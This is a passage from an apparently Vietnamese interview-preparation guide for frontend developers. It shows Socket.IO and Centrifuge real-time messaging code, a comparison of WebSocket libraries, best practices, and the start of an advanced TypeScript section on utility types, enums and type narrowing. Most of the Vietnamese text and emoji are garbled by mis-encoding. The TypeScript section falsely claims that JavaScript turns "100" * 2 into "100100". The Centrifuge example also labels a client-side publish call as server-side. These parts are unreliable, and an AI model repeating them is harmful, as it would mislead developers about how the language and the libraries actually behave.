 * - Auto-reconnection with exponential backoff
 * - Fallback to HTTP long-polling (IE11, corporate firewalls)
 * - Rooms & Namespaces (multi-tenancy)
 * - Acknowledgements (confirm message received)
 * - Binary support (images, files)
 * - Broadcasting
 * 
 * âŒ Disadvantages:
 * - Heavier than native WebSocket (~50KB)
 * - Not compatible with standard WebSocket servers
 * - Requires Socket.IO server
 */

// Client
import { io } from 'socket.io-client';

const socket = io('https://api.example.com', {
  // Auto-reconnection
  reconnection: true,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000,
  reconnectionAttempts: 5,
  
  // Timeout
  timeout: 20000,
  
  // Transports
  transports: ['websocket', 'polling'], // Try WebSocket first, fallback to polling
  
  // Auth
  auth: {
    token: 'Bearer xyz123'
  }
});

// âœ… Auto-reconnection
socket.on('connect', () => {
  console.log('âœ… Connected:', socket.id);
  // Auto re-subscribe after reconnect
  socket.emit('subscribe', { symbols: ['VNM', 'HPG'] });
});

socket.on('disconnect', (reason) => {
  console.log('ğŸ”Œ Disconnected:', reason);
  // Socket.IO will auto-reconnect!
});

// âœ… Rooms - Join specific channels
socket.emit('join-room', 'market-data');

// âœ… Listen to events
socket.on('ticker-update', (data) => {
  console.log('Ticker update:', data);
});

// âœ… Acknowledgements
socket.emit('place-order', orderData, (response) => {
  if (response.success) {
    console.log('Order placed:', response.orderId);
  } else {
    console.error('Order failed:', response.error);
  }
});

// âœ… Binary support
socket.emit('upload-chart', imageBlob);

// Cleanup
socket.disconnect();
```

**Server-side (Node.js):**

```typescript
import { Server } from 'socket.io';

const io = new Server(3000, {
  cors: {
    origin: 'https://example.com',
    credentials: true
  }
});

// Middleware - Authentication
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  
  if (isValidToken(token)) {
    next();
  } else {
    next(new Error('Authentication error'));
  }
});

// Connection
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);

  // Join room
  socket.on('join-room', (room) => {
    socket.join(room);
    console.log(`${socket.id} joined ${room}`);
  });

  // Subscribe to symbols
  socket.on('subscribe', (data) => {
    const { symbols } = data;
    
    symbols.forEach((symbol: string) => {
      socket.join(`ticker:${symbol}`);
    });
    
    // Broadcast to this client
    socket.emit('subscribed', { symbols });
  });

  // Broadcast ticker updates to room
  setInterval(() => {
    const tickerData = getLatestTicker('VNM');
    
    // Send to all clients in room
    io.to('ticker:VNM').emit('ticker-update', tickerData);
  }, 1000);

  // Disconnect
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
  });
});
```

---

#### **Pháº§n 6: Centrifuge - Enterprise Real-time Messaging**

**Centrifuge Features:**

```typescript
/**
 * CENTRIFUGE = Real-time messaging platform vá»›i horizontal scaling
 * 
 * âœ… Advantages:
 * - Horizontal scaling vá»›i Redis, KeyDB, Nats
 * - Channel subscription vá»›i permissions
 * - Presence (online users tracking)
 * - History (message replay)
 * - Token-based auth vá»›i expiration
 * - Binary support
 * - Multiple SDKs (JS, Go, Python, Java...)
 * 
 * âŒ Disadvantages:
 * - Complex setup (need Centrifugo server)
 * - Learning curve
 * - Overkill cho small apps
 * 
 * ğŸ¯ Use Cases:
 * - Trading platforms (high throughput)
 * - Chat applications (presence, history)
 * - Live dashboards (millions of connections)
 * - Multiplayer games
 */

import Centrifuge from 'centrifuge';

const centrifuge = new Centrifuge('ws://localhost:8000/connection/websocket', {
  // Token-based auth
  getToken: async () => {
    const response = await fetch('/api/centrifuge-token');
    const { token } = await response.json();
    return token;
  },
  
  // Auto-resubscribe
  debug: true
});

// Connect
centrifuge.connect();

// Subscribe to channel
const subscription = centrifuge.subscribe('market:stocks', {
  // On publish
  publish: (ctx) => {
    console.log('New message:', ctx.data);
    updateTickerData(ctx.data);
  },
  
  // On subscribe success
  subscribe: (ctx) => {
    console.log('âœ… Subscribed to channel');
    
    // Get presence (online users)
    subscription.presence().then(result => {
      console.log('Online users:', result.clients);
    });
    
    // Get history (last messages)
    subscription.history({ limit: 100 }).then(result => {
      console.log('Message history:', result.publications);
    });
  },
  
  // On unsubscribe
  unsubscribe: (ctx) => {
    console.log('ğŸ”Œ Unsubscribed');
  }
});

// Publish to channel (server-side)
await subscription.publish({
  symbol: 'VNM',
  price: 85000,
  change: 2.5
});

// Presence tracking
subscription.on('presence', (ctx) => {
  console.log('User joined:', ctx.info);
});

// Cleanup
subscription.unsubscribe();
centrifuge.disconnect();
```

**Server-side (Centrifugo):**

```json
// centrifugo.json
{
  "v3_use_offset": true,
  "token_hmac_secret_key": "secret-key",
  "api_key": "api-key",
  "admin_password": "admin-password",
  "admin_secret": "admin-secret",
  "namespaces": [
    {
      "name": "market",
      "publish": true,
      "presence": true,
      "history_size": 100,
      "history_ttl": "60s"
    }
  ]
}
```

---

#### **Pháº§n 7: So SÃ¡nh WebSocket vs Socket.IO vs Centrifuge**

```typescript
/**
 * â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 * â”‚                â”‚  WEBSOCKET     â”‚  SOCKET.IO     â”‚  CENTRIFUGE    â”‚
 * â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 * â”‚ Complexity     â”‚ â­ Low         â”‚ â­â­ Medium    â”‚ â­â­â­ High     â”‚
 * â”‚ Size           â”‚ Native         â”‚ ~50KB          â”‚ ~20KB          â”‚
 * â”‚ Auto-reconnect â”‚ âŒ Manual      â”‚ âœ… Built-in    â”‚ âœ… Built-in    â”‚
 * â”‚ Fallback       â”‚ âŒ No          â”‚ âœ… Long-poll   â”‚ âœ… SSE         â”‚
 * â”‚ Rooms          â”‚ âŒ Manual      â”‚ âœ… Built-in    â”‚ âœ… Channels    â”‚
 * â”‚ Scaling        â”‚ âŒ Single      â”‚ âš ï¸ Redis       â”‚ âœ… Redis/Nats  â”‚
 * â”‚ Binary         â”‚ âœ… Yes         â”‚ âœ… Yes         â”‚ âœ… Yes         â”‚
 * â”‚ Presence       â”‚ âŒ Manual      â”‚ âš ï¸ Custom      â”‚ âœ… Built-in    â”‚
 * â”‚ History        â”‚ âŒ Manual      â”‚ âŒ No          â”‚ âœ… Built-in    â”‚
 * â”‚ Auth           â”‚ âŒ Manual      â”‚ âš ï¸ Custom      â”‚ âœ… JWT Token   â”‚
 * â”‚ Server         â”‚ Any WS server  â”‚ Socket.IO srv  â”‚ Centrifugo     â”‚
 * â”‚ Use Case       â”‚ Simple apps    â”‚ Medium apps    â”‚ Enterprise     â”‚
 * â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 * 
 * ğŸ¯ DECISION TREE:
 * 
 * Simple app, basic real-time (chat, notifications)
 *   â†’ Native WebSocket
 * 
 * Need auto-reconnect, rooms, fallback (IE11 support)
 *   â†’ Socket.IO
 * 
 * Enterprise, millions of connections, horizontal scaling
 *   â†’ Centrifuge
 * 
 * Trading platform, high throughput, low latency
 *   â†’ Centrifuge (with Redis/KeyDB)
 */
```

---

#### **Pháº§n 8: Best Practices**

```typescript
/**
 * âœ… DO:
 */

// 1. Always cleanup WebSocket on unmount
useEffect(() => {
  const ws = new WebSocket(url);
  
  return () => {
    ws.close(1000, 'Component unmounted');
  };
}, []);

// 2. Use reference counting for subscriptions
const subscribe = (symbol: string) => {
  refCount[symbol] = (refCount[symbol] || 0) + 1;
  
  if (refCount[symbol] === 1) {
    ws.send(JSON.stringify({ type: 'subscribe', symbol }));
  }
};

// 3. Throttle UI updates vá»›i requestAnimationFrame
const latestData = useRef({});
const updateUI = () => {
  setData(latestData.current);
  rafId = requestAnimationFrame(updateUI);
};

// 4. Handle reconnection vá»›i exponential backoff
const delay = baseDelay * Math.pow(2, attempts);

// 5. Show connection status to users
<ConnectionStatus status={wsStatus} />

// 6. Batch updates
let batch = [];
const flushBatch = () => {
  updateStore(batch);
  batch = [];
};
setTimeout(flushBatch, 16); // 60fps

// 7. Use virtual scrolling for large lists
<AgGridReact rowData={data} /> // Auto virtual scrolling

/**
 * âŒ DON'T:
 */

// 1. Don't create multiple WebSocket connections for same data
// Use reference counting!

// 2. Don't update UI on every message
// Throttle vá»›i RAF!

// 3. Don't forget to unsubscribe
// Memory leak!

// 4. Don't render all items in large lists
// Use virtual scrolling!

// 5. Don't ignore close codes
// Check if should reconnect!

// 6. Don't use == for subscription checking
// Use Set or Map!
```

---

## **Q66: TypeScript Advanced - TypeScript NÃ¢ng Cao Cho Senior Developer** ğŸ”·

**âš¡ Quick Summary:**
> TypeScript lÃ  superset cá»§a JavaScript cung cáº¥p static typing, giÃºp phÃ¡t hiá»‡n lá»—i sá»›m compile-time thay vÃ¬ runtime, cáº£i thiá»‡n code maintainability vÃ  developer experience vá»›i IntelliSense máº¡nh máº½.

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ¯ **Má»¥c Ä‘Ã­ch**: Static typing = catch bugs sá»›m + better tooling + self-documenting code
- ğŸ”§ **Browser khÃ´ng cháº¡y TS trá»±c tiáº¿p**: Cáº§n transpile qua `tsc` hoáº·c bundler (Vite, esbuild) thÃ nh JavaScript
- âš¡ **Type narrowing**: Thu háº¹p type trong control flow Ä‘á»ƒ TypeScript hiá»ƒu rÃµ hÆ¡n (typeof, instanceof, in operator)
- ğŸ—ï¸ **Utility Types**: CÃ´ng cá»¥ biáº¿n Ä‘á»•i types cÃ³ sáºµn (`Partial<T>`, `Pick<T, K>`, `Omit<T, K>`, `Record<K, V>`)

---

### **1. Táº¡i sao cáº§n TypeScript? Hoáº¡t Ä‘á»™ng nhÆ° tháº¿ nÃ o?**

#### **Váº¥n Ä‘á» vá»›i JavaScript thuáº§n:**
```javascript
// JavaScript - Lá»—i chá»‰ xuáº¥t hiá»‡n khi CHáº Y (runtime)
// NghÄ©a lÃ : Code compile OK, nhÆ°ng khi user dÃ¹ng má»›i phÃ¡t hiá»‡n lá»—i
function calculateTotal(price, quantity) {
  return price * quantity; // âŒ Náº¿u price lÃ  string "100" thÃ¬ sao?
}

calculateTotal("100", 2); // "100100" - Lá»—i ná»‘i chuá»—i thay vÃ¬ nhÃ¢n! ğŸ˜±
// JavaScript tá»± Ä‘á»™ng convert: "100" * 2 thÃ nh "100" + "100" = "100100"
// Kiá»ƒu lá»—i nÃ y ráº¥t khÃ³ debug vÃ¬ khÃ´ng cÃ³ warning!
```

#### **TypeScript giáº£i quyáº¿t:**
```typescript
// TypeScript - Lá»—i báº¯t NGAY KHI VIáº¾T CODE (compile-time)
// Code editor sáº½ gáº¡ch Ä‘á» ngay, chÆ°a cáº§n cháº¡y!
function calculateTotal(price: number, quantity: number): number {
  //                          ^^^^^^        ^^^^^^         ^^^^^^
  //                          Báº¯t buá»™c      Báº¯t buá»™c      Káº¿t quáº£
  //                          pháº£i number   pháº£i number    lÃ  number
  return price * quantity;
}

calculateTotal("100", 2); 
// âŒ VS Code gáº¡ch Ä‘á» ngay: Type 'string' is not assignable to type 'number'
// PhÃ¡t hiá»‡n lá»—i TRÆ¯á»šC KHI CHáº Y, tiáº¿t kiá»‡m thá»i gian debug!
```

#### **Quy trÃ¬nh hoáº¡t Ä‘á»™ng:**
```
ğŸ“ Viáº¿t code TypeScript (.ts) 
    â†“ 
ğŸ”§ TypeScript Compiler (tsc) kiá»ƒm tra types
    â†“ (náº¿u OK, xÃ³a háº¿t type annotations)
ğŸ“„ JavaScript thuáº§n (.js) - browser cÃ³ thá»ƒ cháº¡y
    â†“ 
ğŸŒ Browser/Node.js thá»±c thi
    â†“
âœ… Cháº¡y nhÆ° JavaScript bÃ¬nh thÆ°á»ng
```

**Táº¡i sao browser khÃ´ng cháº¡y TS trá»±c tiáº¿p?**
```typescript
// Code TypeScript nÃ y:
function greet(name: string): string {
  //               ^^^^^^^ Syntax nÃ y
  return `Hello, ${name}`;
}

// Browser tháº¥y dáº¥u : vÃ  string â†’ âŒ Syntax Error!
// VÃ¬ JavaScript engine khÃ´ng hiá»ƒu type annotations
```

**LÃ½ do chi tiáº¿t:**
- ğŸŒ **Browser chá»‰ hiá»ƒu JavaScript**: ES5, ES6, ES2015+, ES2020...
- âŒ **TypeScript cÃ³ syntax riÃªng**: `type`, `interface`, `:`, `<T>`, `as`, `implements`...
- ğŸ”„ **Cáº§n transpilation (biÃªn dá»‹ch)**: 
  - XÃ³a táº¥t cáº£ type annotations (`: string`, `<T>`)
  - Chuyá»ƒn syntax má»›i vá» syntax cÅ© (ES6 â†’ ES5 náº¿u cáº§n)
  - Káº¿t quáº£: JavaScript thuáº§n mÃ  browser/Node.js cháº¡y Ä‘Æ°á»£c

---

### **2. Utility Types - Biáº¿n Ä‘á»•i Types**

> **Utility Types** lÃ  cÃ¡c "cÃ´ng cá»¥" TypeScript cung cáº¥p sáºµn Ä‘á»ƒ **biáº¿n Ä‘á»•i** types cÃ³ sáºµn thÃ nh types má»›i

#### **2.1. Partial<T> - Biáº¿n táº¥t cáº£ properties thÃ nh optional (khÃ´ng báº¯t buá»™c)**
```typescript
interface User {
  id: number;      // Báº¯t buá»™c
  name: string;    // Báº¯t buá»™c
  email: string;   // Báº¯t buá»™c
}

// âŒ Váº¥n Ä‘á»: Khi update user, khÃ´ng muá»‘n báº¯t buá»™c gá»­i háº¿t fields
function updateUser(id: number, updates: User) {
  // Pháº£i gá»­i Ä‘á»§ id, name, email â†’ Ráº¥t báº¥t tiá»‡n!
}

// âœ… Giáº£i phÃ¡p: DÃ¹ng Partial<User>
function updateUser(id: number, updates: Partial<User>) {
  // Partial<User> = {
  //   id?: number;      â† ThÃªm dáº¥u ? (optional)
  //   name?: string;    â† ThÃªm dáº¥u ? (optional)
  //   email?: string;   â† ThÃªm dáº¥u ? (optional)
  // }
  // BÃ¢y giá» cÃ³ thá»ƒ gá»­i chá»‰ 1 field!
}

updateUser(1, { name: "John" }); // âœ… OK - chá»‰ update name
updateUser(1, { email: "john@example.com" }); // âœ… OK - chá»‰ update email
updateUser(1, { name: "John", email: "john@example.com" }); // âœ… OK - update nhiá»u fields
```

#### **2.2. Pick<T, K> - "Chá»n lá»c" má»™t sá»‘ properties tá»« type**
```typescript
// CÃ³ User Ä‘áº§y Ä‘á»§
interface User {
  id: number;
  name: string;
  email: string;
  password: string;  // KhÃ´ng muá»‘n hiá»ƒn thá»‹ ra ngoÃ i!
  createdAt: Date;
}

// âœ… Chá»‰ láº¥y id vÃ  name Ä‘á»ƒ hiá»ƒn thá»‹ preview
type UserPreview = Pick<User, 'id' | 'name'>;
// Káº¿t quáº£: { id: number; name: string }
// Tá»± Ä‘á»™ng "copy" type cá»§a id vÃ  name tá»« User

const preview: UserPreview = {
  id: 1,
  name: "John"
  // email: "..." // âŒ Error: email KHÃ”NG cÃ³ trong UserPreview
  // Báº£o máº­t: khÃ´ng lá»™ email, password ra ngoÃ i
};
```

#### **2.3. Omit<T, K> - "Loáº¡i bá»" má»™t sá»‘ properties (ngÆ°á»£c láº¡i Pick)**
```typescript
// âŒ Váº¥n Ä‘á»: Khi táº¡o user má»›i, chÆ°a cÃ³ id (id do database tá»± táº¡o)
interface User {
  id: number;      // ChÆ°a cÃ³ khi táº¡o má»›i
  name: string;
  email: string;
}

// âœ… Giáº£i phÃ¡p: Loáº¡i bá» id
type UserWithoutId = Omit<User, 'id'>;
// Káº¿t quáº£: { name: string; email: string }
// Tá»± Ä‘á»™ng loáº¡i bá» id, giá»¯ láº¡i name vÃ  email

const newUser: UserWithoutId = {
  name: "Jane",
  email: "jane@example.com"
  // KhÃ´ng cáº§n id vÃ¬ chÆ°a lÆ°u database
};

// Khi nÃ o dÃ¹ng Pick vs Omit?
// Pick: Khi muá»‘n Láº¤Y Ã­t fields (vd: 2/10 fields)
// Omit: Khi muá»‘n Bá» Ã­t fields (vd: bá» 1/10 fields, giá»¯ 9 fields)
```

#### **2.4. Record<K, V> - Táº¡o object type tá»« danh sÃ¡ch keys vÃ  value type**
```typescript
// âŒ CÃ¡ch cÅ©: Äá»‹nh nghÄ©a tá»«ng key thá»§ cÃ´ng
type Permissions = {
  admin: string[];
  user: string[];
  guest: string[];
  // Náº¿u thÃªm role má»›i â†’ pháº£i sá»­a láº¡i Ä‘Ã¢y!
};

// âœ… CÃ¡ch má»›i: DÃ¹ng Record
type Role = 'admin' | 'user' | 'guest';  // Danh sÃ¡ch roles
type Permissions = Record<Role, string[]>;
//                 ^^^^^^ 
//                 Tá»± Ä‘á»™ng táº¡o object vá»›i keys lÃ  'admin' | 'user' | 'guest'
//                 vÃ  value cá»§a má»—i key lÃ  string[]

const permissions: Permissions = {
  admin: ['read', 'write', 'delete'],  // Admin Ä‘Æ°á»£c lÃ m táº¥t cáº£
  user: ['read', 'write'],             // User chá»‰ Ä‘á»c vÃ  ghi
  guest: ['read']                      // Guest chá»‰ Ä‘á»c
  // âœ… TypeScript báº¯t buá»™c pháº£i cÃ³ Ä‘á»§ 3 keys: admin, user, guest
  // âŒ Thiáº¿u key hoáº·c sai tÃªn â†’ Compile error ngay!
};

// á»¨ng dá»¥ng thá»±c táº¿: API responses
type Status = 'success' | 'error' | 'pending';
type Messages = Record<Status, string>;

const messages: Messages = {
  success: 'ThÃ nh cÃ´ng!',
  error: 'CÃ³ lá»—i xáº£y ra!',
  pending: 'Äang xá»­ lÃ½...'
  // Báº¯t buá»™c pháº£i cÃ³ Ä‘á»§ 3 messages cho 3 status
};
```

#### **2.5. Required<T>, Readonly<T>, ReturnType<T>**
```typescript
// Required<T> - NgÆ°á»£c láº¡i Partial, biáº¿n táº¥t cáº£ thÃ nh Báº®T BUá»˜C
type OptionalUser = Partial<User>;  // Táº¥t cáº£ optional
type RequiredUser = Required<OptionalUser>;  // Táº¥t cáº£ báº¯t buá»™c láº¡i
// DÃ¹ng khi: API tráº£ vá» data cÃ³ thá»ƒ thiáº¿u fields, nhÆ°ng sau khi validate thÃ¬ Ä‘áº§y Ä‘á»§

// Readonly<T> - Biáº¿n táº¥t cáº£ properties thÃ nh KHÃ”NG THá»‚ Sá»¬A
type ImmutableUser = Readonly<User>;
const user: ImmutableUser = { id: 1, name: "John", email: "john@example.com" };
// user.name = "Jane"; // âŒ Error: Cannot assign to 'name' because it is a read-only property
// DÃ¹ng khi: Dá»¯ liá»‡u tá»« API, config files - khÃ´ng muá»‘n ai sá»­a Ä‘á»•i

// ReturnType<T> - Láº¥y type cá»§a giÃ¡ trá»‹ return tá»« function
function getUser() {
  return { id: 1, name: "John", email: "john@example.com" };
}

type UserReturnType = ReturnType<typeof getUser>;
// Káº¿t quáº£: { id: number; name: string; email: string }
// Lá»£i Ã­ch: KhÃ´ng cáº§n Ä‘á»‹nh nghÄ©a interface User riÃªng, tá»± Ä‘á»™ng láº¥y tá»« function
```

---

### **3. as const vs enum**

> **as const** vÃ  **enum** Ä‘á»u dÃ¹ng Ä‘á»ƒ táº¡o constants, nhÆ°ng cÃ¡ch hoáº¡t Ä‘á»™ng vÃ  use cases khÃ¡c nhau

#### **3.1. as const - Biáº¿n object thÃ nh "Ä‘Ã³ng bÄƒng" vá»›i literal types**
```typescript
// âŒ KhÃ´ng dÃ¹ng as const - types rá»™ng
const COLORS = {
  RED: '#FF0000',    // type: string (rá»™ng, cÃ³ thá»ƒ lÃ  báº¥t ká»³ string nÃ o)
  GREEN: '#00FF00',  // type: string
  BLUE: '#0000FF'    // type: string
};

COLORS.RED = '#000000'; // âœ… OK - CÃ³ thá»ƒ thay Ä‘á»•i giÃ¡ trá»‹!

// âœ… DÃ¹ng as const - types cá»¥ thá»ƒ
const COLORS = {
  RED: '#FF0000',
  GREEN: '#00FF00',
  BLUE: '#0000FF'
} as const;
//^^^^^^^^^^ Tá»« khÃ³a magic nÃ y lÃ m 2 viá»‡c:
// 1. Biáº¿n object thÃ nh readonly (khÃ´ng sá»­a Ä‘Æ°á»£c)
// 2. Biáº¿n types thÃ nh literal (cá»¥ thá»ƒ '#FF0000' thay vÃ¬ string)

// COLORS.RED = '#000000'; // âŒ Error: Cannot assign to 'RED' because it is a read-only property

// Láº¥y type cá»§a values
type Color = typeof COLORS[keyof typeof COLORS]; 
// Káº¿t quáº£: '#FF0000' | '#00FF00' | '#0000FF'
// ^^^^^^^ Literal types cá»¥ thá»ƒ, KHÃ”NG pháº£i string chung chung!
```

#### **3.2. enum - Kiá»ƒu liá»‡t kÃª (enumeration)**
```typescript
// enum táº¡o ra má»™t "nhÃ³m" cÃ¡c constants cÃ³ liÃªn quan
enum Status {
  Pending = 'PENDING',    // GÃ¡n giÃ¡ trá»‹ cá»¥ thá»ƒ
  Approved = 'APPROVED',
  Rejected = 'REJECTED'
}

// DÃ¹ng enum trong function parameter
function handleStatus(status: Status) {
  // TypeScript biáº¿t status chá»‰ cÃ³ thá»ƒ lÃ  1 trong 3 giÃ¡ trá»‹
  switch (status) {
    case Status.Pending:   // Xá»­ lÃ½ Ä‘Æ¡n Ä‘ang chá»
      console.log('Äang chá» duyá»‡t...');
      break;
    case Status.Approved:  // Xá»­ lÃ½ Ä‘Æ¡n Ä‘Ã£ duyá»‡t
      console.log('ÄÃ£ phÃª duyá»‡t!');
      break;
    case Status.Rejected:  // Xá»­ lÃ½ Ä‘Æ¡n bá»‹ tá»« chá»‘i
      console.log('ÄÃ£ tá»« chá»‘i!');
      break;
  }
}

handleStatus(Status.Pending); // âœ… OK
// handleStatus('PENDING'); // âŒ Error: Pháº£i dÃ¹ng Status.Pending, khÃ´ng Ä‘Æ°á»£c dÃ¹ng string trá»±c tiáº¿p
```

#### **3.3. Reverse Mapping (chá»‰ numeric enum cÃ³)**
```typescript
// Numeric enum - Tá»± Ä‘á»™ng gÃ¡n sá»‘
enum Direction {
  Up,      // = 0
  Down,    // = 1
  Left,    // = 2
  Right    // = 3
}

// âœ… Reverse mapping: Láº¥y tÃªn tá»« giÃ¡ trá»‹ sá»‘
console.log(Direction[0]); // "Up"
console.log(Direction[2]); // "Left"
console.log(Direction.Up); // 0

// âŒ String enum KHÃ”NG cÃ³ reverse mapping
enum Status {
  Pending = 'PENDING'
}
// console.log(Status['PENDING']); // âŒ KhÃ´ng cÃ³ reverse mapping
```

#### **So sÃ¡nh chi tiáº¿t:**
| Feature | as const | enum |
|---------|----------|------|
| **Compile thÃ nh JS** | Biáº¿n object bÃ¬nh thÆ°á»ng | Object hoáº·c biáº¿n máº¥t (const enum) |
| **Tree-shaking** | âœ… Tá»‘t (webpack xÃ³a code khÃ´ng dÃ¹ng) | âŒ KÃ©m (giá»¯ cáº£ object) |
| **Type safety** | âœ… Literal types ('#FF0000') | âœ… Enum type riÃªng (Status) |
| **Runtime tá»“n táº¡i?** | âœ… CÃ³ (lÃ  object) | âœ… CÃ³ (trá»« const enum) |
| **Reverse mapping** | âŒ KhÃ´ng (pháº£i tá»± viáº¿t) | âœ… CÃ³ (chá»‰ numeric enum) |
| **DÃ¹ng nhÆ° value** | âœ… `COLORS.RED` | âœ… `Status.Pending` |
| **Bundle size** | Nhá» hÆ¡n | Lá»›n hÆ¡n (trá»« const enum) |

**ğŸ’¡ Khi nÃ o dÃ¹ng cÃ¡i nÃ o?**
```typescript
// âœ… DÃ¹ng as const khi:
// - Config files, constants Ä‘Æ¡n giáº£n
// - Muá»‘n bundle size nhá»
// - KhÃ´ng cáº§n reverse mapping
const API_ENDPOINTS = {
  LOGIN: '/api/login',
  LOGOUT: '/api/logout',
  PROFILE: '/api/profile'
} as const;

// âœ… DÃ¹ng enum khi:
// - Cáº§n iterate qua táº¥t cáº£ values
// - Cáº§n reverse mapping (numeric enum)
// - Muá»‘n type riÃªng biá»‡t (Status type khÃ¡c string type)
enum HttpMethod {
  GET = 'GET',
  POST = 'POST',
  PUT = 'PUT',
  DELETE = 'DELETE'
}

// Iterate qua enum
Object.values(HttpMethod).forEach(method => {
  console.log(method); // GET, POST, PUT, DELETE
});
```

---

### **4. type vs interface**

> **type** vÃ  **interface** Ä‘á»u Ä‘á»‹nh nghÄ©a shape cá»§a objects, nhÆ°ng cÃ³ khÃ¡c biá»‡t quan trá»ng

#### **4.1. Giá»‘ng nhau - Äá»‹nh nghÄ©a object shape:**
```typescript
// CÃ¡ch 1: DÃ¹ng type
type TypeUser = {
  name: string;
  age: number;
};

// CÃ¡ch 2: DÃ¹ng interface
interface InterfaceUser {
  name: string;
  age: number;
}

// Cáº£ 2 Ä‘á»u dÃ¹ng giá»‘ng nhau
const user1: TypeUser = { name: "John", age: 30 };
const user2: InterfaceUser = { name: "Jane", age: 25 };
```

#### **4.2. KhÃ¡c nhau:**

**A. Declaration Merging - Tá»± Ä‘á»™ng gá»™p (chá»‰ interface):**
```typescript
// âŒ type KHÃ”NG merge Ä‘Æ°á»£c
type Window = {
  title: string;
};

type Window = {  // âŒ Error: Duplicate identifier 'Window'
  version: number;
};

// âœ… interface Tá»° Äá»˜NG merge
interface Window {
  title: string;
}

interface Window {  // âœ… OK - Tá»± Ä‘á»™ng gá»™p láº¡i!
  version: number;
}

// Káº¿t quáº£ cuá»‘i cÃ¹ng:
// interface Window {
//   title: string;    â† Tá»« khai bÃ¡o 1
//   version: number;  â† Tá»« khai bÃ¡o 2
// }

const myWindow: Window = {
  title: "My App",
  version: 1  // Pháº£i cÃ³ cáº£ 2 properties
};

// á»¨ng dá»¥ng thá»±c táº¿: Má»Ÿ rá»™ng types cá»§a libraries
// VÃ­ dá»¥: ThÃªm property vÃ o Express Request
declare global {
  interface Window {
    myCustomProperty: string;  // ThÃªm property má»›i vÃ o Window object
  }
}
```

**B. Union/Intersection - type linh hoáº¡t hÆ¡n:**
```typescript
// âœ… type cÃ³ thá»ƒ lÃ  UNION (hoáº·c)
type Status = 'success' | 'error' | 'pending';
type ID = string | number;

// âŒ interface KHÃ”NG lÃ m Ä‘Æ°á»£c union
// interface Status = 'success' | 'error'; // âŒ Syntax error!

// âœ… type cÃ³ thá»ƒ lÃ  INTERSECTION (gá»™p)
type Person = {
  name: string;
};

type Employee = Person & {
  employeeId: number;  // Gá»™p Person + employeeId
};

const employee: Employee = {
  name: "John",      // Tá»« Person
  employeeId: 123    // ThÃªm má»›i
};
```

**C. Mapped Types - Biáº¿n Ä‘á»•i types (chá»‰ type):**
```typescript
// âœ… type há»— trá»£ mapped types (duyá»‡t qua keys)
type Keys = 'name' | 'age';
type User = {
  [K in Keys]: string;  // Duyá»‡t qua 'name' vÃ  'age', gÃ¡n type string
};
// Káº¿t quáº£: { name: string; age: string }

// âŒ interface KHÃ”NG há»— trá»£ mapped types trá»±c tiáº¿p
// interface User {
//   [K in Keys]: string;  // âŒ Error!
// }
```

**D. Extends vs Intersection - CÃ¡ch káº¿ thá»«a:**
```typescript
// Interface dÃ¹ng EXTENDS (káº¿ thá»«a)
interface Animal {
  name: string;
}

interface Dog extends Animal {
  bark(): void;  // Thá»«a káº¿ name tá»« Animal, thÃªm bark()
}

const dog: Dog = {
  name: "Buddy",  // Tá»« Animal
  bark: () => console.log("Woof!")  // Tá»« Dog
};

// Type dÃ¹ng INTERSECTION (&)
type Animal = {
  name: string;
};

type Dog = Animal & {
  bark(): void;
};
// Káº¿t quáº£ giá»‘ng nhau, nhÆ°ng syntax khÃ¡c
```

**ğŸ’¡ Quy táº¯c chá»n type vs interface:**
```typescript
// âœ… DÃ¹ng INTERFACE khi:
// 1. Äá»‹nh nghÄ©a PUBLIC API (libraries, components)
interface ButtonProps {
  label: string;
  onClick: () => void;
}

// 2. Cáº§n EXTENDS trong OOP
interface Animal {
  eat(): void;
}
interface Dog extends Animal {
  bark(): void;
}

// 3. Muá»‘n Declaration Merging (má»Ÿ rá»™ng sau)
interface User {
  name: string;
}
// CÃ³ thá»ƒ thÃªm properties sau nÃ y


// âœ… DÃ¹ng TYPE khi:
// 1. Union types
type Status = 'loading' | 'success' | 'error';

// 2. Intersection types phá»©c táº¡p
type Admin = User & Permissions & Logs;

// 3. Mapped types, utility types
type ReadonlyUser = {
  readonly [K in keyof User]: User[K];
};

// 4. Primitive aliases
type ID = string | number;
type Callback = () => void;
```

---

### **5. Type Narrowing - Thu háº¹p kiá»ƒu (Type Guards)**

> **Type Narrowing** = Thu háº¹p type tá»« rá»™ng â†’ háº¹p trong control flow Ä‘á»ƒ TypeScript hiá»ƒu chÃ­nh xÃ¡c type

#### **5.1. typeof guard - Kiá»ƒm tra kiá»ƒu primitive:**
```typescript
// Váº¥n Ä‘á»: value cÃ³ thá»ƒ lÃ  string HOáº¶C number
function processValue(value: string | number) {
  // âŒ KhÃ´ng narrow: TypeScript khÃ´ng biáº¿t value lÃ  gÃ¬
  // return value.toUpperCase(); // Error: number khÃ´ng cÃ³ toUpperCase()
  // return value.toFixed(2);    // Error: string khÃ´ng cÃ³ toFixed()
  
  // âœ… DÃ¹ng typeof Ä‘á»ƒ narrow
  if (typeof value === 'string') {
    // Trong block nÃ y, TypeScript BIáº¾T cháº¯c value lÃ  string
